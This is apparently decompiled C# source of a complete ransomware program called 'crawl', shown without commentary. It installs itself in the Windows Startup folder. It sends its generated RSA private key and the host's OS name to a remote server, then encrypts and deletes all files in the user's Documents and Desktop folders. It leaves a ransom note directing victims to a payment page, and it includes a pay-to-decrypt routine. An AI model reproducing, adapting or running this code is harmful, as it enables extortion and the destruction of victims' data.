using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace crawl
{
	// Token: 0x02000002 RID: 2
	internal class crawl
	{
		// Token: 0x0600000B RID: 11 RVA: 0x00002700 File Offset: 0x00000900
		private bool Decrypt(string file_in, string extens)
		{
			bool result;
			try
			{
				FileInfo fileInfo = new FileInfo(file_in);
				FileStream fileStream = File.Open(file_in, FileMode.Open, FileAccess.Read, FileShare.Read);
				FileStream fileStream2 = File.Open(file_in.Replace(extens, ""), FileMode.Create, FileAccess.Write, FileShare.Write);
				byte[] array = new byte[128];
				byte[] array2 = new byte[128];
				while (fileStream.Read(array, 0, 128) > 0)
				{
					array2 = this.rsa.Decrypt(array, false);
					fileStream2.Write(array2, 0, array2.Length);
				}
				fileStream.Close();
				fileStream2.Close();
				result = true;
			}
			catch (Exception var_7_82)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000261C File Offset: 0x0000081C
		private bool Encrypt(string file_in, string enc_ext)
		{
			bool result;
			try
			{
				FileInfo fileInfo = new FileInfo(file_in);
				FileStream fileStream = File.Open(file_in + enc_ext, FileMode.Create, FileAccess.Write, FileShare.Write);
				FileStream fileStream2 = File.Open(file_in, FileMode.Open, FileAccess.Read, FileShare.Read);
				byte[] array = new byte[32];
				byte[] array2 = new byte[32];
				int num;
				while ((num = fileStream2.Read(array, 0, 32)) > 0)
				{
					if (num != array.Length)
					{
						byte[] array3 = new byte[num];
						for (int i = 0; i < num; i++)
						{
							array3[i] = array[i];
						}
						array2 = this.rsa.Encrypt(array3, false);
						fileStream.Write(array2, 0, array2.Length);
					}
					else
					{
						array2 = this.rsa.Encrypt(array, false);
						fileStream.Write(array2, 0, array2.Length);
					}
				}
				fileStream2.Close();
				fileStream.Close();
				result = true;
			}
			catch (Exception var_9_BD)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000027A8 File Offset: 0x000009A8
		private void genkey()
		{
			this.rsa = new RSACryptoServiceProvider();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000025D4 File Offset: 0x000007D4
		private bool load_key(string p)
		{
			bool result;
			try
			{
				StreamReader streamReader = File.OpenText(p);
				string xmlString = streamReader.ReadToEnd();
				this.rsa.FromXmlString(xmlString);
				streamReader.Close();
				result = true;
			}
			catch (Exception var_3_24)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002074 File Offset: 0x00000274
		[STAThread]
		private static void Main(string[] args)
		{
			crawl crawl = new crawl();
			crawl.cr_path = new string[]
			{
				crawl.path_doc,
				crawl.path_desk
			};
			crawl.blob_loc = crawl.path_desk;
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\crawl.exe");
			}
			catch (Exception var_1_51)
			{
			}
			if ((args.Length != 0 && File.Exists(args[0])) || crawl.Read("KK") == "UN")
			{
				string text = args[0];
				if (text.Length <= 0)
				{
					text = crawl.blob_loc + "\\" + crawl.cert_priv;
				}
				if (crawl.load_key(text))
				{
					crawl.Write("KK", "UN");
					if (!File.Exists(crawl.blob_loc + "\\" + crawl.cert_priv))
					{
						File.Copy(text, crawl.blob_loc + "\\" + crawl.cert_priv);
					}
					try
					{
						for (int i = 0; i < crawl.cr_path.Length; i++)
						{
							string[] files = Directory.GetFiles(crawl.cr_path[0], "*" + crawl.ext_end, SearchOption.AllDirectories);
							for (int j = 0; j < files.Length; j++)
							{
								if (files[j].EndsWith(crawl.ext_end) && crawl.Decrypt(files[j], crawl.ext_end))
								{
									File.Delete(files[j]);
								}
							}
						}
					}
					catch
					{
					}
					crawl.Write("KK", "DONE");
					RSAParameters rSAParameters = crawl.rsa.ExportParameters(true);
					WebRequest webRequest = WebRequest.Create(crawl.serv_page_done);
					webRequest.Method = "POST";
					string s = "public=" + crawl.rsa.ToXmlString(false);
					byte[] bytes = Encoding.UTF8.GetBytes(s);
					webRequest.ContentType = "application/x-www-form-urlencoded";
					webRequest.ContentLength = (long)bytes.Length;
					Stream stream = webRequest.GetRequestStream();
					stream.Write(bytes, 0, bytes.Length);
					stream.Close();
					WebResponse response = webRequest.GetResponse();
					stream = response.GetResponseStream();
					StreamReader streamReader = new StreamReader(stream);
					string text2 = streamReader.ReadToEnd();
					streamReader.Close();
					stream.Close();
					response.Close();
					return;
				}
			}
			else
			{
				while (crawl.Read("KK") == null)
				{
					crawl.Write("KK", "OK");
				}
				if (crawl.Read("KK") == "OK")
				{
					crawl.genkey();
					crawl.save_keys(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), crawl.serv_page);
					if (crawl.kill_switch)
					{
						if (crawl.load_key(crawl.blob_loc + "\\" + crawl.cert_pub))
						{
							try
							{
								for (int k = 0; k < crawl.cr_path.Length; k++)
								{
									string[] files2 = Directory.GetFiles(crawl.cr_path[k], "*.*", SearchOption.AllDirectories);
									for (int l = 0; l < files2.Length; l++)
									{
										if (!files2[l].EndsWith(crawl.ext_end) && !files2[l].EndsWith(".rkf") && crawl.Encrypt(files2[l], crawl.ext_end))
										{
											File.Delete(files2[l]);
										}
									}
								}
							}
							catch
							{
							}
						}
						string value = "Your system files has been encrypted and only way to recover them is by purchasing unlocking key.\r\nSteps to gain access for files:\r\n1) Please follow this page: http://sigmalab.lv/other/crypt/payment_request.php\r\n2) Upload your public encryption key\r\n3) Download decryption key\r\n4) Drag and drop key on crawl.exe\r\n5) Wait for files to be unlocked in background";
						if (!File.Exists(crawl.blob_loc + "\\your system has been encrypted! please read further instruction!.txt"))
						{
							StreamWriter streamWriter = new StreamWriter(crawl.blob_loc + "\\your system has been encrypted! please read further instruction!.txt");
							streamWriter.WriteLine(value);
							streamWriter.Close();
						}
						if (!File.Exists(crawl.blob_loc + "\\" + crawl.my_name))
						{
							File.Delete(crawl.blob_loc + "\\" + crawl.my_name);
							File.Copy(Assembly.GetExecutingAssembly().Location, crawl.blob_loc + "\\" + crawl.my_name);
							return;
						}
					}
				}
				else if (crawl.Read("KK").ToString() == "DONE")
				{
					try
					{
						File.Delete(Assembly.GetExecutingAssembly().Location);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000256C File Offset: 0x0000076C
		private bool net()
		{
			bool result;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					using (webClient.OpenRead("http://sigmalab.lv"))
					{
						result = true;
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000024D0 File Offset: 0x000006D0
		public string Read(string KeyName)
		{
			RegistryKey registryKey = this.baseRegistryKey;
			RegistryKey registryKey2 = registryKey.OpenSubKey(this.subKey);
			if (registryKey2 == null)
			{
				return null;
			}
			string result;
			try
			{
				result = (string)registryKey2.GetValue(KeyName.ToUpper());
			}
			catch (Exception var_3_2E)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000027B8 File Offset: 0x000009B8
		private bool save_keys(string save_loc, string page)
		{
			bool result = true;
			RSAParameters rSAParameters = this.rsa.ExportParameters(true);
			try
			{
				if (!File.Exists(save_loc + "\\" + this.cert_pub))
				{
					result = false;
					try
					{
						while (!this.net())
						{
							Thread.Sleep(5000);
						}
						RSAParameters rSAParameters2 = this.rsa.ExportParameters(true);
						WebRequest webRequest = WebRequest.Create(page);
						webRequest.Method = "POST";
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
						string text = (string)registryKey.GetValue("productName");
						string s = string.Concat(new string[]
						{
							"private=",
							this.rsa.ToXmlString(true),
							"&public=",
							this.rsa.ToXmlString(false),
							"&os=",
							text
						});
						byte[] bytes = Encoding.UTF8.GetBytes(s);
						webRequest.ContentType = "application/x-www-form-urlencoded";
						webRequest.ContentLength = (long)bytes.Length;
						Stream stream = webRequest.GetRequestStream();
						stream.Write(bytes, 0, bytes.Length);
						stream.Close();
						WebResponse response = webRequest.GetResponse();
						if (((HttpWebResponse)response).StatusDescription == "OK")
						{
							this.kill_switch = true;
							StreamWriter streamWriter = File.CreateText(save_loc + "\\" + this.cert_pub);
							streamWriter.Write(this.rsa.ToXmlString(false));
							streamWriter.Close();
						}
						stream = response.GetResponseStream();
						StreamReader streamReader = new StreamReader(stream);
						string text2 = streamReader.ReadToEnd();
						streamReader.Close();
						stream.Close();
						response.Close();
					}
					catch (Exception var_13_197)
					{
					}
				}
				this.kill_switch = true;
			}
			catch (Exception var_14_1A4)
			{
				this.kill_switch = false;
				result = false;
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002524 File Offset: 0x00000724
		public bool Write(string KeyName, object Value)
		{
			bool result;
			try
			{
				RegistryKey registryKey = this.baseRegistryKey;
				RegistryKey registryKey2 = registryKey.CreateSubKey(this.subKey);
				registryKey2.SetValue(KeyName.ToUpper(), Value);
				result = true;
			}
			catch (Exception var_3_25)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x17000002 RID: 2
		public RegistryKey BaseRegistryKey
		{
			// Token: 0x06000003 RID: 3 RVA: 0x00002061 File Offset: 0x00000261
			get
			{
				return this.baseRegistryKey;
			}
			// Token: 0x06000004 RID: 4 RVA: 0x00002069 File Offset: 0x00000269
			set
			{
				this.baseRegistryKey = value;
			}
		}

		// Token: 0x17000001 RID: 1
		public string SubKey
		{
			// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
			get
			{
				return this.subKey;
			}
			// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
			set
			{
				this.subKey = value;
			}
		}

		// Token: 0x04000010 RID: 16
		private RegistryKey baseRegistryKey = Registry.CurrentUser;

		// Token: 0x04000009 RID: 9
		private string blob_loc = "";

		// Token: 0x0400000E RID: 14
		private string cert_priv = "your_decryption_key.rkf";

		// Token: 0x0400000D RID: 13
		private string cert_pub = "your_encryption_public_key.rkf";

		// Token: 0x04000008 RID: 8
		private string[] cr_path;

		// Token: 0x0400000B RID: 11
		private string ext_end = ".via";

		// Token: 0x04000001 RID: 1
		public bool kill_switch;

		// Token: 0x0400000A RID: 10
		private string my_name = "crawl.exe";

		// Token: 0x04000007 RID: 7
		private string path_desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x04000006 RID: 6
		private string path_doc = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x04000002 RID: 2
		private RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

		// Token: 0x04000004 RID: 4
		private string serv_page = "http://sigmalab.lv/other/crypt/client.php?newcrypt";

		// Token: 0x04000005 RID: 5
		private string serv_page_done = "http://sigmalab.lv/other/crypt/client.php?setpaid";

		// Token: 0x0400000C RID: 12
		private string[] skip_list = new string[]
		{
			".rkf",
			".exe"
		};

		// Token: 0x0400000F RID: 15
		private string subKey = "SOFTWARE\\crawl";

		// Token: 0x04000003 RID: 3
		private Thread thread;
	}
}
